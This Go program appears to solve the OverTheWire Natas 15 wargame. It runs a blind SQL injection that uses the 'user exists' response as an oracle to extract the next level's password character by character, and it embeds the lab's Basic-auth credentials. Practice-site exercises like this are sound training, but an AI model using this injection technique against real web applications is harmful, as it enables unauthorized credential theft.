package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"golang.org/x/net/html"
)

func findDivByID(n *html.Node, id string) string {
	if n.Type == html.ElementNode && n.Data == "div" {
		for _, attr := range n.Attr {
			if attr.Key == "id" && attr.Val == id {
				return n.FirstChild.Data
			}
		}
	}
	for c := n.FirstChild; c != nil; c = c.NextSibling {
		if result := findDivByID(c, id); result != "" {
			return result
		}
	}
	return ""
}

func main() {
	urlik := "http://natas15.natas.labs.overthewire.org/"
	characters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	password2 := ""
	username := "natas15"
	password := "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

	for len(password2) < 32 {
		for _, char := range characters {
			password2 += string(char)

			data := url.Values{}
			data.Add("username", "natas16\" AND binary password like \""+password2+"%%\" # ")
			// Create the auth string
			auth := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))

			req, err := http.NewRequest("POST", urlik, strings.NewReader(data.Encode()))
			if err != nil {
				fmt.Printf("Error creating request: %v\n", err)
				return
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			// Set the Authorization header
			req.Header.Set("Authorization", "Basic "+auth)

			// Send the request
			client := &http.Client{}

			resp, err := client.Do(req)
			if err != nil {
				fmt.Printf("Error sending request: %v\n", err)
				return
			}
			defer resp.Body.Close()

			// Check the response status
			if resp.StatusCode != http.StatusOK {
				fmt.Printf("Request failed with status: %s\n", resp.Status)
				return
			}

			// Read the response body
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				fmt.Printf("Error reading response: %v\n", err)
				return
			}

			// Parse the HTML
			doc, err := html.Parse(strings.NewReader(string(body)))
			if err != nil {
				fmt.Printf("Error parsing HTML: %v\n", err)
				return
			}

			// Find the div with the id "content"
			textinDiv := strings.TrimSpace(findDivByID(doc, "content"))

			if textinDiv != "This user exists." {
				password2 = password2[:len(password2)-1]
			} else {
				break
			}
		}
		fmt.Println("Password:", password2)
	}
}
